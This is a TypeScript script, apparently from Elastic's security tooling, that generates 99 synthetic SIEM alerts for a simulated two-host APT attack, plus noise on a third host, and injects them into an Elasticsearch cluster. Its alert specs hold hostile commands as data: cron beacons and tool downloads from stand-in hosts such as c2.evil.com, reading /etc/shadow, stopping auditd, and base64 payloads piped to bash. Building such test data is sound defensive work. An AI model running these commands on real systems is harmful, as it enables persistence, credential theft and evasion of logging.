/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

/**
 * Recreate Multi-Host Attack alerts on a target Elastic cluster.
 *
 * Generates 99 realistic security alerts simulating a multi-host APT-style
 * data exfiltration attack spanning two hosts (HOST1 → lateral movement → HOST2),
 * plus noise alerts on a third host that should NOT be grouped as an attack.
 *
 * The attack follows a full MITRE ATT&CK kill chain:
 *   Initial Access → Execution → Discovery → Credential Access →
 *   Defense Evasion → Persistence → Lateral Movement → Priv Escalation →
 *   Collection → Exfiltration → C2
 *
 * No external dependencies — uses Node.js built-in fetch and crypto.
 *
 * Usage:
 *   # Inject into local dev cluster
 *   npx tsx recreate_multi_host_attack.ts --es-url http://localhost:9200 -u elastic -p changeme
 *
 *   # Inject into cloud cluster
 *   npx tsx recreate_multi_host_attack.ts --es-url https://cluster:9243 --api-key <key>
 *
 *   # Custom host names
 *   npx tsx recreate_multi_host_attack.ts --es-url http://localhost:9200 -u elastic -p changeme \
 *     --host1 my-server-1 --host2 my-server-2 --host3 noise-server
 *
 *   # Dry run
 *   npx tsx recreate_multi_host_attack.ts --es-url http://localhost:9200 -u elastic -p changeme --dry-run
 *
 *   # Cleanup previously injected alerts
 *   npx tsx recreate_multi_host_attack.ts --es-url http://localhost:9200 -u elastic -p changeme --cleanup
 */

import { randomUUID } from 'crypto';

// ── Constants ──

const DEFAULT_ALERT_INDEX = '.internal.alerts-security.alerts-default-000001';
const INJECTED_TAG = 'multi-host-attack-demo';

const DEFAULT_HOST1 = 'patryk-defend-367602-1';
const DEFAULT_HOST2 = 'patryk-defend-367602-2';
const DEFAULT_HOST3 = 'patryk-defend-367602-3';

// ── Types ──

interface AlertSpec {
  minuteOffset: number;
  secondOffset: number;
  host: string;
  ruleName: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  riskScore: number;
  tacticName: string;
  tacticId: string;
  techniqueName: string;
  techniqueId: string;
  processName: string;
  processArgs: string[];
  description: string;
  /** Override event category for source event (defaults to 'process') */
  eventCategory?: 'process' | 'file' | 'network';
  /** File path for file-category events */
  filePath?: string;
  /** Destination IP for network-category events */
  destinationIp?: string;
  /** Destination port for network-category events */
  destinationPort?: number;
}

interface PreparedSourceEvent {
  id: string;
  index: string;
  source: Record<string, unknown>;
}

interface PreparedAlert {
  id: string;
  source: Record<string, unknown>;
  /** The source event(s) that triggered this alert */
  sourceEvents: PreparedSourceEvent[];
}

interface ParsedArgs {
  esUrl: string;
  apiKey?: string;
  user?: string;
  password?: string;
  insecure: boolean;
  host1: string;
  host2: string;
  host3: string;
  index: string;
  dryRun: boolean;
  cleanup: boolean;
  summaryOnly: boolean;
}

// ── HTTP Client ──

class ESClient {
  private readonly baseUrl: string;
  private readonly headers: Record<string, string>;

  constructor({
    baseUrl,
    apiKey,
    user,
    password,
  }: {
    baseUrl: string;
    apiKey?: string;
    user?: string;
    password?: string;
  }) {
    this.baseUrl = baseUrl.replace(/\/$/, '');
    this.headers = { 'Content-Type': 'application/json' };

    if (apiKey) {
      this.headers.Authorization = `ApiKey ${apiKey}`;
    } else if (user && password) {
      const creds = Buffer.from(`${user}:${password}`).toString('base64');
      this.headers.Authorization = `Basic ${creds}`;
    }
  }

  async request(
    method: string,
    path: string,
    body?: unknown,
    contentType?: string
  ): Promise<{ status: number; body: unknown }> {
    const url = `${this.baseUrl}${path}`;
    const headers = { ...this.headers };
    if (contentType) {
      headers['Content-Type'] = contentType;
    }
    const init: RequestInit = { method, headers };
    if (body !== undefined) {
      init.body = typeof body === 'string' ? body : JSON.stringify(body);
    }
    try {
      const resp = await fetch(url, init);
      const text = await resp.text();
      try {
        return { status: resp.status, body: JSON.parse(text) };
      } catch {
        return { status: resp.status, body: text };
      }
    } catch (err) {
      console.error(`ERROR: Connection failed: ${(err as Error).message}`);
      return { status: 0, body: (err as Error).message };
    }
  }

  get(path: string) {
    return this.request('GET', path);
  }
  post(path: string, body?: unknown, contentType?: string) {
    return this.request('POST', path, body, contentType);
  }
  head(path: string) {
    return this.request('HEAD', path);
  }
}

// ── Alert Generation ──

const ruleIds: Record<string, string> = {};
function getRuleId(name: string): string {
  if (!ruleIds[name]) {
    ruleIds[name] = randomUUID();
  }
  return ruleIds[name];
}

function hostIp(host: string, host1: string, host2: string): string[] {
  if (host === host1) return ['10.128.0.187'];
  if (host === host2) return ['10.128.0.174'];
  return ['10.128.0.190'];
}

const hostAgentIds: Record<string, string> = {};
function getAgentId(host: string): string {
  if (!hostAgentIds[host]) {
    hostAgentIds[host] = randomUUID();
  }
  return hostAgentIds[host];
}

const hostEntityIds: Record<string, string> = {};
function getHostId(host: string): string {
  if (!hostEntityIds[host]) {
    hostEntityIds[host] = randomUUID().replace(/-/g, '');
  }
  return hostEntityIds[host];
}

// ── Source Event Generation ──

const SOURCE_EVENT_TAG = 'multi-host-attack-demo';

function getEventDataStream(category: string): { dataset: string; index: string } {
  switch (category) {
    case 'file':
      return {
        dataset: 'endpoint.events.file',
        index: '.ds-logs-endpoint.events.file-default-2026.01.30-000001',
      };
    case 'network':
      return {
        dataset: 'endpoint.events.network',
        index: '.ds-logs-endpoint.events.network-default-2026.01.30-000001',
      };
    default:
      return {
        dataset: 'endpoint.events.process',
        index: '.ds-logs-endpoint.events.process-default-2026.01.30-000001',
      };
  }
}

function buildSourceEvent(
  spec: AlertSpec,
  timestamp: Date,
  host1: string,
  host2: string
): PreparedSourceEvent {
  const eventId = randomUUID();
  const docId = randomUUID().replace(/-/g, '');
  const category = spec.eventCategory ?? 'process';
  const { dataset, index } = getEventDataStream(category);
  const agentId = getAgentId(spec.host);
  const hostId = getHostId(spec.host);

  const pid = 1000 + Math.floor(Math.random() * 64000);
  const parentPid = 100 + Math.floor(Math.random() * 900);
  const entityId = randomUUID().replace(/-/g, '').slice(0, 22);
  const parentEntityId = randomUUID().replace(/-/g, '').slice(0, 22);

  const source: Record<string, unknown> = {
    '@timestamp': timestamp.toISOString(),
    event: {
      action: category === 'process' ? ['exec'] : category === 'file' ? ['modification'] : ['connection_attempted'],
      agent_id_status: 'verified',
      category: [category],
      created: timestamp.toISOString(),
      dataset,
      id: eventId,
      ingested: new Date(timestamp.getTime() + 500).toISOString(),
      kind: 'event',
      module: 'endpoint',
      outcome: 'success',
      sequence: 100000 + Math.floor(Math.random() * 900000),
      type: category === 'process' ? ['start'] : category === 'file' ? ['change'] : ['start'],
    },
    agent: {
      id: agentId,
      type: 'endpoint',
      version: '9.4.0-SNAPSHOT',
    },
    host: {
      id: hostId,
      name: spec.host,
      hostname: spec.host,
      os: {
        family: 'linux',
        name: 'Ubuntu',
        version: '22.04.5 LTS',
        platform: 'linux',
        type: 'linux',
      },
      ip: hostIp(spec.host, host1, host2),
    },
    user: {
      id: '0',
      name: 'root',
    },
    process: {
      Ext: {
        ancestry: [parentEntityId],
      },
      args: spec.processArgs,
      args_count: spec.processArgs.length,
      command_line: spec.processArgs.join(' '),
      entity_id: entityId,
      executable: `/usr/bin/${spec.processName}`,
      name: spec.processName,
      pid,
      parent: {
        args: ['bash'],
        args_count: 1,
        command_line: 'bash',
        entity_id: parentEntityId,
        executable: '/usr/bin/bash',
        name: 'bash',
        pid: parentPid,
      },
      working_directory: '/root',
    },
    message: spec.description,
    data_stream: {
      dataset,
      namespace: 'default',
      type: 'logs',
    },
    ecs: { version: '8.11.0' },
    elastic: {
      agent: {
        id: agentId,
      },
    },
    tags: [SOURCE_EVENT_TAG],
  };

  // Add file-specific fields
  if (category === 'file' && spec.filePath) {
    (source as Record<string, unknown>).file = {
      path: spec.filePath,
      name: spec.filePath.split('/').pop(),
    };
  }

  // Add network-specific fields
  if (category === 'network') {
    (source as Record<string, unknown>).destination = {
      ip: spec.destinationIp ?? '198.51.100.42',
      port: spec.destinationPort ?? 443,
    };
    (source as Record<string, unknown>).source = {
      ip: hostIp(spec.host, host1, host2)[0],
      port: 40000 + Math.floor(Math.random() * 20000),
    };
    (source as Record<string, unknown>).network = {
      protocol: 'tcp',
      direction: 'egress',
      transport: 'tcp',
    };
  }

  return { id: docId, index, source };
}

function buildAlertSource(
  spec: AlertSpec,
  baseTime: Date,
  host1: string,
  host2: string,
  sourceEvent: PreparedSourceEvent
): Record<string, unknown> {
  const timestamp = new Date(
    baseTime.getTime() + spec.minuteOffset * 60_000 + spec.secondOffset * 1_000
  );
  const alertId = randomUUID();
  const ruleId = getRuleId(spec.ruleName);
  const agentId = getAgentId(spec.host);
  const hostId = getHostId(spec.host);

  // Copy process fields from source event for consistency
  const srcProcess = (sourceEvent.source as Record<string, unknown>).process as Record<string, unknown>;

  return {
    '@timestamp': timestamp.toISOString(),
    'event.kind': 'signal',
    'event.category': ['process'],
    'event.action': 'exec',
    'event.created': timestamp.toISOString(),
    'event.module': 'endpoint',
    host: {
      id: hostId,
      name: spec.host,
      hostname: spec.host,
      os: {
        family: 'linux',
        name: 'Ubuntu',
        version: '22.04.5 LTS',
        platform: 'linux',
        type: 'linux',
      },
      ip: hostIp(spec.host, host1, host2),
    },
    process: {
      name: spec.processName,
      args: spec.processArgs,
      command_line: spec.processArgs.join(' '),
      pid: (srcProcess?.pid as number) ?? 1000 + Math.floor(Math.random() * 64000),
      executable: `/usr/bin/${spec.processName}`,
      entity_id: (srcProcess?.entity_id as string) ?? randomUUID().replace(/-/g, '').slice(0, 22),
      parent: {
        name: 'bash',
        pid: ((srcProcess?.parent as Record<string, unknown>)?.pid as number) ?? 100 + Math.floor(Math.random() * 900),
        entity_id: ((srcProcess?.parent as Record<string, unknown>)?.entity_id as string) ?? randomUUID().replace(/-/g, '').slice(0, 22),
      },
    },
    user: { name: 'root', id: '0' },
    message: spec.description,
    // Ancestors: link to the source event
    'kibana.alert.ancestors': [
      {
        depth: 0,
        index: sourceEvent.index,
        id: sourceEvent.id,
        type: 'event',
      },
    ],
    'kibana.alert.rule.name': spec.ruleName,
    'kibana.alert.rule.uuid': ruleId,
    'kibana.alert.rule.category': 'Custom Query Rule',
    'kibana.alert.rule.consumer': 'siem',
    'kibana.alert.rule.producer': 'siem',
    'kibana.alert.rule.rule_type_id': 'siem.queryRule',
    'kibana.alert.rule.parameters': {},
    'kibana.alert.rule.description': spec.description,
    'kibana.alert.rule.threat': [
      {
        framework: 'MITRE ATT&CK',
        tactic: {
          id: spec.tacticId,
          name: spec.tacticName,
          reference: `https://attack.mitre.org/tactics/${spec.tacticId}/`,
        },
        technique: [
          {
            id: spec.techniqueId,
            name: spec.techniqueName,
            reference: `https://attack.mitre.org/techniques/${spec.techniqueId}/`,
          },
        ],
      },
    ],
    'kibana.alert.rule.severity': spec.severity,
    'kibana.alert.rule.risk_score': spec.riskScore,
    'kibana.alert.original_time': timestamp.toISOString(),
    'kibana.alert.uuid': alertId,
    'kibana.alert.status': 'active',
    'kibana.alert.workflow_status': 'open',
    'kibana.alert.workflow_tags': [],
    'kibana.alert.case_ids': [],
    'kibana.alert.workflow_assignee_ids': [],
    'kibana.alert.severity': spec.severity,
    'kibana.alert.risk_score': spec.riskScore,
    'kibana.alert.reason': spec.description,
    'kibana.alert.depth': 1,
    'kibana.alert.rule.execution.uuid': randomUUID(),
    'kibana.space_ids': ['default'],
    'kibana.version': '8.18.0',
    threat: [
      {
        framework: 'MITRE ATT&CK',
        tactic: { id: spec.tacticId, name: spec.tacticName },
        technique: [{ id: spec.techniqueId, name: spec.techniqueName }],
      },
    ],
    tags: ['OS: Linux', INJECTED_TAG],
    agent: { id: agentId, type: 'endpoint', version: '9.4.0' },
    ecs: { version: '8.11.0' },
  };
}

function generateAttackSpecs(host1: string, host2: string, host3: string): AlertSpec[] {
  const specs: AlertSpec[] = [];

  // Helper to push N copies with offset spacing
  const repeat = (
    count: number,
    baseMin: number,
    secSpacing: number,
    template: Omit<AlertSpec, 'minuteOffset' | 'secondOffset'>
  ) => {
    for (let i = 0; i < count; i++) {
      specs.push({ ...template, minuteOffset: baseMin, secondOffset: i * secSpacing });
    }
  };

  // ════════════════════════════════════════════════════════════════
  // ATTACK: APT-style data exfiltration across HOST1 → HOST2
  // ════════════════════════════════════════════════════════════════

  // Stage 1: Initial Execution on HOST1 (T1059 + T1027)
  repeat(12, 0, 15, {
    host: host1,
    ruleName: 'Base64 Decoded Payload Piped to Interpreter',
    severity: 'high',
    riskScore: 73,
    tacticName: 'Execution',
    tacticId: 'TA0002',
    techniqueName: 'Command and Scripting Interpreter',
    techniqueId: 'T1059',
    processName: 'bash',
    processArgs: ['bash', '-c', 'echo d2hvYW1p | base64 -d | bash'],
    description: `Base64 encoded payload decoded and piped to bash interpreter on ${host1}`,
  });

  repeat(4, 3, 20, {
    host: host1,
    ruleName: 'Potential Reverse Shell Activity via Terminal',
    severity: 'high',
    riskScore: 73,
    tacticName: 'Execution',
    tacticId: 'TA0002',
    techniqueName: 'Command and Scripting Interpreter',
    techniqueId: 'T1059',
    processName: 'python3',
    processArgs: ['python3', '-c', "import pty; pty.spawn('/bin/sh')"],
    description: `Interactive terminal spawned via Python on ${host1}, possible reverse shell`,
  });

  // Stage 2: Discovery on HOST1 (T1033, T1049)
  repeat(3, 5, 30, {
    host: host1,
    ruleName: 'System Owner/User Discovery Linux',
    severity: 'low',
    riskScore: 21,
    tacticName: 'Discovery',
    tacticId: 'TA0007',
    techniqueName: 'System Owner/User Discovery',
    techniqueId: 'T1033',
    processName: 'whoami',
    processArgs: ['whoami'],
    description: `System owner discovery commands executed on ${host1}`,
  });

  repeat(3, 6, 30, {
    host: host1,
    ruleName: 'System Network Connections Discovery',
    severity: 'low',
    riskScore: 21,
    tacticName: 'Discovery',
    tacticId: 'TA0007',
    techniqueName: 'System Network Connections Discovery',
    techniqueId: 'T1049',
    processName: 'ss',
    processArgs: ['ss', '-tlnp'],
    description: `Network connection enumeration on ${host1}`,
  });

  // Stage 3: Credential Access on HOST1 (T1003)
  repeat(3, 8, 40, {
    host: host1,
    ruleName: 'Potential Shadow File Read via Command Line Utilities',
    severity: 'high',
    riskScore: 73,
    tacticName: 'Credential Access',
    tacticId: 'TA0006',
    techniqueName: 'OS Credential Dumping',
    techniqueId: 'T1003',
    processName: 'cat',
    processArgs: ['cat', '/etc/shadow'],
    description: `Shadow file read via cat on ${host1} — credential harvesting`,
  });

  // Stage 4: Defense Evasion on HOST1 (T1070, T1562)
  repeat(4, 10, 25, {
    host: host1,
    ruleName: 'Timestomping using Touch Command',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Defense Evasion',
    tacticId: 'TA0005',
    techniqueName: 'Indicator Removal',
    techniqueId: 'T1070',
    processName: 'touch',
    processArgs: ['touch', '-t', '202001010000', '/tmp/.payload'],
    description: `File timestamp modified to evade detection on ${host1}`,
    eventCategory: 'file',
    filePath: '/tmp/.payload',
  });

  specs.push({
    minuteOffset: 11,
    secondOffset: 0,
    host: host1,
    ruleName: 'Attempt to Disable Auditd Service',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Defense Evasion',
    tacticId: 'TA0005',
    techniqueName: 'Impair Defenses',
    techniqueId: 'T1562',
    processName: 'systemctl',
    processArgs: ['systemctl', 'stop', 'auditd'],
    description: `Attempt to stop auditd service on ${host1} to evade logging`,
  });

  // Stage 5: Persistence on HOST1 (T1053, T1543)
  repeat(3, 12, 30, {
    host: host1,
    ruleName: 'Cron Job Created or Modified',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Persistence',
    tacticId: 'TA0003',
    techniqueName: 'Scheduled Task/Job',
    techniqueId: 'T1053',
    processName: 'bash',
    processArgs: [
      'bash',
      '-c',
      "echo '*/5 * * * * root curl -s http://c2.evil.com/beacon' > /etc/cron.d/update",
    ],
    description: `Cron job created for C2 callback persistence on ${host1}`,
  });

  repeat(2, 13, 45, {
    host: host1,
    ruleName: 'Systemd Service Created',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Persistence',
    tacticId: 'TA0003',
    techniqueName: 'Create or Modify System Process',
    techniqueId: 'T1543',
    processName: 'bash',
    processArgs: ['bash', '-c', 'systemctl daemon-reload'],
    description: `Systemd service created for persistent backdoor on ${host1}`,
  });

  // Stage 6: Lateral Movement HOST1 → HOST2 (T1021)
  repeat(3, 15, 20, {
    host: host1,
    ruleName: 'Unusual SSHD Child Process',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Lateral Movement',
    tacticId: 'TA0008',
    techniqueName: 'Remote Services',
    techniqueId: 'T1021',
    processName: 'ssh',
    processArgs: ['ssh', '-o', 'StrictHostKeyChecking=no', 'root@10.128.0.174'],
    description: `SSH lateral movement from ${host1} to ${host2}`,
    eventCategory: 'network',
    destinationIp: '10.128.0.174',
    destinationPort: 22,
  });

  // Stage 7: Execution on HOST2 — attacker moved laterally
  repeat(10, 18, 12, {
    host: host2,
    ruleName: 'Base64 Decoded Payload Piped to Interpreter',
    severity: 'high',
    riskScore: 73,
    tacticName: 'Execution',
    tacticId: 'TA0002',
    techniqueName: 'Command and Scripting Interpreter',
    techniqueId: 'T1059',
    processName: 'bash',
    processArgs: ['bash', '-c', 'echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash'],
    description: `Base64 encoded payload on ${host2} after lateral movement from ${host1}`,
  });

  repeat(3, 20, 25, {
    host: host2,
    ruleName: 'Binary Executed from Shared Memory Directory',
    severity: 'high',
    riskScore: 73,
    tacticName: 'Execution',
    tacticId: 'TA0002',
    techniqueName: 'Command and Scripting Interpreter',
    techniqueId: 'T1059',
    processName: '.recon',
    processArgs: ['/dev/shm/.recon'],
    description: `Binary executed from /dev/shm on ${host2} — staging area for tools`,
  });

  // Stage 8: Privilege Escalation on HOST2 (T1548)
  repeat(3, 22, 30, {
    host: host2,
    ruleName: 'SUID/SGID Bit Set',
    severity: 'low',
    riskScore: 21,
    tacticName: 'Privilege Escalation',
    tacticId: 'TA0004',
    techniqueName: 'Abuse Elevation Control Mechanism',
    techniqueId: 'T1548',
    processName: 'chmod',
    processArgs: ['chmod', '4755', '/tmp/.suid_shell'],
    description: `SUID bit set on binary for privilege escalation on ${host2}`,
  });

  // Stage 9: Credential Access on HOST2 (T1003)
  repeat(2, 24, 45, {
    host: host2,
    ruleName: 'Potential Shadow File Read via Command Line Utilities',
    severity: 'high',
    riskScore: 73,
    tacticName: 'Credential Access',
    tacticId: 'TA0006',
    techniqueName: 'OS Credential Dumping',
    techniqueId: 'T1003',
    processName: 'cat',
    processArgs: ['cat', '/etc/shadow'],
    description: `Shadow file dumped on ${host2} for credential harvesting`,
  });

  // Stage 10: Exfil channel on HOST2 (T1059)
  repeat(4, 26, 20, {
    host: host2,
    ruleName: 'Potential Reverse Shell Activity via Terminal',
    severity: 'high',
    riskScore: 73,
    tacticName: 'Execution',
    tacticId: 'TA0002',
    techniqueName: 'Command and Scripting Interpreter',
    techniqueId: 'T1059',
    processName: 'python3',
    processArgs: ['python3', '-c', 'import socket,subprocess; s=socket.socket()'],
    description: `Reverse shell activity on ${host2} — likely data exfiltration channel`,
  });

  // Stage 11: Defense Evasion on HOST2 (T1070)
  repeat(3, 28, 25, {
    host: host2,
    ruleName: 'Timestomping using Touch Command',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Defense Evasion',
    tacticId: 'TA0005',
    techniqueName: 'Indicator Removal',
    techniqueId: 'T1070',
    processName: 'touch',
    processArgs: ['touch', '-t', '201901010000', '/tmp/.backdoor'],
    description: `Timestomping on ${host2} to cover tracks`,
    eventCategory: 'file',
    filePath: '/tmp/.backdoor',
  });

  // Stage 12: Persistence on HOST2 (T1053)
  repeat(3, 30, 30, {
    host: host2,
    ruleName: 'Cron Job Created or Modified',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Persistence',
    tacticId: 'TA0003',
    techniqueName: 'Scheduled Task/Job',
    techniqueId: 'T1053',
    processName: 'bash',
    processArgs: [
      'bash',
      '-c',
      "echo '*/10 * * * * root /tmp/.exfil' > /etc/cron.d/data_sync",
    ],
    description: `Cron-based persistence on ${host2} for data exfiltration`,
  });

  // Stage 13: More /dev/shm execution on HOST2
  repeat(5, 32, 15, {
    host: host2,
    ruleName: 'Binary Executed from Shared Memory Directory',
    severity: 'high',
    riskScore: 73,
    tacticName: 'Execution',
    tacticId: 'TA0002',
    techniqueName: 'Command and Scripting Interpreter',
    techniqueId: 'T1059',
    processName: '.crypto_miner',
    processArgs: ['/dev/shm/.crypto_miner'],
    description: `Suspicious binary executed from /dev/shm on ${host2}`,
  });

  // Stage 14: Lateral tool transfer HOST2 → HOST1 (T1570)
  repeat(2, 34, 30, {
    host: host2,
    ruleName: 'Unusual Remote File Creation',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Lateral Movement',
    tacticId: 'TA0008',
    techniqueName: 'Lateral Tool Transfer',
    techniqueId: 'T1570',
    processName: 'scp',
    processArgs: ['scp', '/tmp/.exfil_data', 'root@10.128.0.187:/tmp/'],
    description: `Remote file transfer from ${host2} to ${host1} via SCP`,
    eventCategory: 'network',
    destinationIp: '10.128.0.187',
    destinationPort: 22,
  });

  // Stage 15: C2 on HOST1 (T1105)
  repeat(3, 36, 20, {
    host: host1,
    ruleName: 'Ingress Tool Transfer via Command Line Utility',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Command and Control',
    tacticId: 'TA0011',
    techniqueName: 'Ingress Tool Transfer',
    techniqueId: 'T1105',
    processName: 'curl',
    processArgs: ['curl', '-o', '/tmp/.beacon', 'http://evil.example.com/tools/beacon'],
    description: `Tool download from C2 server on ${host1}`,
    eventCategory: 'network',
    destinationIp: '198.51.100.42',
    destinationPort: 80,
  });

  // Stage 16: Hidden files on HOST1 (T1564)
  repeat(2, 38, 40, {
    host: host1,
    ruleName: 'Hidden Files and Directories',
    severity: 'medium',
    riskScore: 47,
    tacticName: 'Defense Evasion',
    tacticId: 'TA0005',
    techniqueName: 'Hide Artifacts',
    techniqueId: 'T1564',
    processName: 'mkdir',
    processArgs: ['mkdir', '-p', '/tmp/.cache/.hidden_tools'],
    description: `Hidden directory created to conceal attack tools on ${host1}`,
    eventCategory: 'file',
    filePath: '/tmp/.cache/.hidden_tools',
  });

  // ════════════════════════════════════════════════════════════════
  // NOISE: Scattered low-severity discovery on HOST3
  // ════════════════════════════════════════════════════════════════

  // Spread noise randomly across the time window
  const noiseSpecs: Array<Omit<AlertSpec, 'minuteOffset' | 'secondOffset'>> = [
    {
      host: host3,
      ruleName: 'System Owner/User Discovery Linux',
      severity: 'low',
      riskScore: 21,
      tacticName: 'Discovery',
      tacticId: 'TA0007',
      techniqueName: 'System Owner/User Discovery',
      techniqueId: 'T1033',
      processName: 'whoami',
      processArgs: ['whoami'],
      description: `User discovery command on ${host3}`,
    },
    {
      host: host3,
      ruleName: 'System Owner/User Discovery Linux',
      severity: 'low',
      riskScore: 21,
      tacticName: 'Discovery',
      tacticId: 'TA0007',
      techniqueName: 'System Owner/User Discovery',
      techniqueId: 'T1033',
      processName: 'id',
      processArgs: ['id'],
      description: `User identity check on ${host3} — routine admin`,
    },
    {
      host: host3,
      ruleName: 'Linux System Information Discovery',
      severity: 'low',
      riskScore: 21,
      tacticName: 'Discovery',
      tacticId: 'TA0007',
      techniqueName: 'System Information Discovery',
      techniqueId: 'T1082',
      processName: 'uname',
      processArgs: ['uname', '-a'],
      description: `System information discovery on ${host3}`,
    },
    {
      host: host3,
      ruleName: 'Linux System Information Discovery',
      severity: 'low',
      riskScore: 21,
      tacticName: 'Discovery',
      tacticId: 'TA0007',
      techniqueName: 'System Information Discovery',
      techniqueId: 'T1082',
      processName: 'hostnamectl',
      processArgs: ['hostnamectl'],
      description: `System info check on ${host3} — routine admin`,
    },
    {
      host: host3,
      ruleName: 'Process Discovery via Built-In Applications',
      severity: 'low',
      riskScore: 21,
      tacticName: 'Discovery',
      tacticId: 'TA0007',
      techniqueName: 'Process Discovery',
      techniqueId: 'T1057',
      processName: 'ps',
      processArgs: ['ps', 'aux'],
      description: `Process listing on ${host3}`,
    },
    {
      host: host3,
      ruleName: 'System Network Connections Discovery',
      severity: 'low',
      riskScore: 21,
      tacticName: 'Discovery',
      tacticId: 'TA0007',
      techniqueName: 'System Network Connections Discovery',
      techniqueId: 'T1049',
      processName: 'netstat',
      processArgs: ['netstat', '-tlnp'],
      description: `Network enumeration on ${host3}`,
    },
    {
      host: host3,
      ruleName: 'System Hosts File Access',
      severity: 'low',
      riskScore: 21,
      tacticName: 'Discovery',
      tacticId: 'TA0007',
      techniqueName: 'System Network Configuration Discovery',
      techniqueId: 'T1016',
      processName: 'cat',
      processArgs: ['cat', '/etc/hosts'],
      description: `Hosts file read on ${host3} — likely admin activity`,
    },
  ];

  // Scatter 8 user-discovery, 6 sysinfo, 2 proc-disc, 2 net-disc, 1 hosts across 40 min
  const noiseDistribution = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 2, 2, 2, 3, 3, 3, 4, 4, 5, 5, 6];
  for (const idx of noiseDistribution) {
    const template = noiseSpecs[idx % noiseSpecs.length];
    specs.push({
      ...template,
      minuteOffset: 2 + Math.floor(Math.random() * 38),
      secondOffset: Math.floor(Math.random() * 55),
    });
  }

  // A couple of stray low-severity noise alerts on HOST1 and HOST2 (unrelated to main attack)
  specs.push({
    minuteOffset: 39,
    secondOffset: 10,
    host: host1,
    ruleName: 'Process Discovery via Built-In Applications',
    severity: 'low',
    riskScore: 21,
    tacticName: 'Discovery',
    tacticId: 'TA0007',
    techniqueName: 'Process Discovery',
    techniqueId: 'T1057',
    processName: 'top',
    processArgs: ['top', '-bn1'],
    description: `Process listing on ${host1} — routine admin check`,
  });

  specs.push({
    minuteOffset: 37,
    secondOffset: 30,
    host: host2,
    ruleName: 'System Hosts File Access',
    severity: 'low',
    riskScore: 21,
    tacticName: 'Discovery',
    tacticId: 'TA0007',
    techniqueName: 'System Network Configuration Discovery',
    techniqueId: 'T1016',
    processName: 'cat',
    processArgs: ['cat', '/etc/hosts'],
    description: `Hosts file read on ${host2} — routine admin check`,
  });

  return specs;
}

function prepareAlerts(args: ParsedArgs): PreparedAlert[] {
  const baseTime = new Date(Date.now() - 45 * 60_000); // 45 min ago
  const specs = generateAttackSpecs(args.host1, args.host2, args.host3);

  return specs.map((spec) => {
    const timestamp = new Date(
      baseTime.getTime() + spec.minuteOffset * 60_000 + spec.secondOffset * 1_000
    );
    // Generate the source event first
    const sourceEvent = buildSourceEvent(spec, timestamp, args.host1, args.host2);
    // Then build the alert linking to the source event
    const source = buildAlertSource(spec, baseTime, args.host1, args.host2, sourceEvent);
    const id = source['kibana.alert.uuid'] as string;
    return { id, source, sourceEvents: [sourceEvent] };
  });
}

// ── Actions ──

async function checkCluster(client: ESClient): Promise<boolean> {
  const { status, body } = await client.get('/_cluster/health');
  if (status === 200 && typeof body === 'object' && body !== null) {
    const health = body as Record<string, unknown>;
    console.log(`  Cluster: ${health.cluster_name ?? 'unknown'}`);
    console.log(`  Status:  ${health.status ?? 'unknown'}`);
    console.log(`  Nodes:   ${health.number_of_nodes ?? '?'}`);
    return true;
  }
  console.error(
    `  ERROR: Cluster returned ${status}: ${JSON.stringify(body).slice(0, 200)}`
  );
  return false;
}

async function bulkIndex(
  client: ESClient,
  docs: Array<{ id: string; index: string; source: Record<string, unknown> }>,
  label: string,
  dryRun: boolean
): Promise<number> {
  if (docs.length === 0) return 0;

  if (dryRun) {
    console.log(`\n  [DRY RUN] Would inject ${docs.length} ${label}`);
    return 0;
  }

  const lines: string[] = [];
  for (const { id, index, source } of docs) {
    lines.push(JSON.stringify({ index: { _index: index, _id: id } }));
    lines.push(JSON.stringify(source));
  }
  const bulkBody = lines.join('\n') + '\n';

  const { status, body } = await client.post('/_bulk?refresh=true', bulkBody, 'application/x-ndjson');

  if ((status !== 200 && status !== 201) || typeof body !== 'object' || body === null) {
    console.error(`  ERROR: Bulk request failed (${status}): ${JSON.stringify(body).slice(0, 500)}`);
    return 0;
  }

  const result = body as { items?: Array<{ index?: { _id: string; status: number; error?: { type: string; reason: string } } }> };
  const items = result.items ?? [];
  let errors = 0;
  for (const item of items) {
    if (item.index?.error) {
      errors++;
      if (errors <= 3) {
        console.error(`  ERROR: ${item.index.error.type}: ${item.index.error.reason.slice(0, 200)}`);
      }
    }
  }
  if (errors > 3) {
    console.error(`  ... and ${errors - 3} more errors`);
  }
  return items.length - errors;
}

async function injectAlerts(
  client: ESClient,
  docs: PreparedAlert[],
  index: string,
  dryRun: boolean
): Promise<{ alertsInjected: number; eventsInjected: number }> {
  if (dryRun) {
    console.log(`\n  [DRY RUN] Would inject ${docs.length} alerts into ${index}`);
    for (const { source } of docs.slice(0, 5)) {
      const host =
        typeof source.host === 'object' && source.host !== null
          ? ((source.host as Record<string, unknown>).name as string) ?? '?'
          : '?';
      const rule = (source['kibana.alert.rule.name'] as string) ?? '?';
      const ts = (source['@timestamp'] as string) ?? '?';
      console.log(`    ${rule.padEnd(55)} | ${host} | ${ts}`);
    }
    if (docs.length > 5) {
      console.log(`    ... and ${docs.length - 5} more`);
    }
    return { alertsInjected: 0, eventsInjected: 0 };
  }

  // Step 1: Inject source events first (alerts reference them)
  const allSourceEvents: Array<{ id: string; index: string; source: Record<string, unknown> }> = [];
  for (const { sourceEvents } of docs) {
    allSourceEvents.push(...sourceEvents);
  }

  // Group source events by type for reporting
  const byType: Record<string, number> = {};
  for (const evt of allSourceEvents) {
    const ds = (evt.source.data_stream as Record<string, unknown>)?.dataset as string ?? 'unknown';
    byType[ds] = (byType[ds] ?? 0) + 1;
  }

  console.log(`\n── Injecting ${allSourceEvents.length} source events ──`);
  for (const [ds, count] of Object.entries(byType)) {
    console.log(`    ${ds}: ${count}`);
  }
  const eventsInjected = await bulkIndex(client, allSourceEvents, 'source events', dryRun);
